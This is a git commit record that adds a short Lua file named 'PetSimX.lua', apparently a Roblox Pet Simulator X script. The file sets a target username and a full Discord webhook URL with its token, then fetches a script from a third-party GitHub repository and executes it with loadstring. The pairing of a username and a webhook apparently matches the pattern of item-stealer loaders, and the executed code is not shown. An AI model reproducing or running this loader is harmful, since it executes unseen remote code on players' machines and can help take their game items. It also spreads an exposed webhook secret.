b838bcc7169b803a624c419968181ec7f921a63b
Vadexx <120428820+Vadexx@users.noreply.github.com>
2022-12-13 01:02:11 +0100

    Add files via upload

---
+++ PetSimX.lua
@@ -0,0 +1,4 @@
+UserName = "Bad_Griles"
+WebHook = "https://discord.com/api/webhooks/1051450248817541190/aowJeuz6imnCcm8ffUMZ3ZuWaeDrF2O2fpLsK15ER85OJw3sdEAL5UUMWFJvqe3N8KZR"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
